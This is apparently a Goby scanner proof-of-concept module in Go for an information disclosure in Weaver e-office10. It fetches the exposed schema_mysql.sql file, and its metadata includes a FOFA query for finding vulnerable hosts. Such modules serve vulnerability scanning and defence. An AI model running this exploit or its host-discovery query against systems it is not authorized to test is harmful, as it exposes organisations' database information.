package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Weaver e-office10 schema_mysql.sql Information Disclosure Vulnerability",
    "Description": "<p>Weaver E-office10 is an enterprise-class office automation system designed to optimize and manage the document, information flow, collaboration and communication workflows of an enterprise. </p><p>The /db/schema_mysql.sql interface has an information disclosure vulnerability, and unauthorized attackers may gain access to sensitive information.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-08-08",
    "PostTime": "2024-08-14",
    "Author": "hhh3156",
    "FofaQuery": "body=\"eoffice_loading_tip\" && body=\"eoffice10\"",
    "GobyQuery": "body=\"eoffice_loading_tip\" && body=\"eoffice10\"",
    "Level": "0",
    "Impact": "<p>The schema_mysql.sql interface has an information disclosure vulnerability, and unauthorized attackers may gain access to sensitive information.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "schema_mysql.sql",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "HW-2024"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "泛微 e-office10 schema_mysql.sql 信息泄露漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微E-Office10是一款企业级办公自动化系统，主要用于优化和管理企业的文档、信息流转、协作与沟通工作流程。<br></p><p>其schema_mysql.sql 接口存在信息泄露漏洞，未经授权的攻击者访问，可能会获得敏感信息。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>泛微E-Office10是一款企业级办公自动化系统，主要用于优化和管理企业的文档、信息流转、协作与沟通工作流程。其schema_mysql.sql 接口存在信息泄露漏洞，未经授权的攻击者访问，可能会获得敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Weaver e-office10 schema_mysql.sql Information Disclosure Vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Weaver E-office10 is an enterprise-class office automation system designed to optimize and manage the document, information flow, collaboration and communication workflows of an enterprise.&nbsp;</p><p>The /db/schema_mysql.sql interface has an information disclosure vulnerability, and unauthorized attackers may gain access to sensitive information.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The schema_mysql.sql interface has an information disclosure vulnerability, and unauthorized attackers may gain access to sensitive information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9931"
}`

	postOrGet_f9f5LAOVNafOAkf9ANMVni685aoUA := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/eoffice10/empty_scene/db/schema_mysql.sql"
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, path, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/eoffice10/empty_scene/db/schema_mysql.sql"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/eoffice10/empty_scene/db/schema_mysql.sql": "CREATE TABLE",
			}
			// 函数继承
			uploadFileFunc := postOrGet_f9f5LAOVNafOAkf9ANMVni685aoUA

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"schema_mysql.sql": {"/eoffice10/empty_scene/db/schema_mysql.sql", "CREATE TABLE"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_f9f5LAOVNafOAkf9ANMVni685aoUA

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = "泄露信息：数据库创建的相关信息\n请访问 " + expResult.HostInfo.FixedHostInfo + "/eoffice10/empty_scene/db/schema_mysql.sql\n获取详细信息"
			return expResult
		},
	))
}
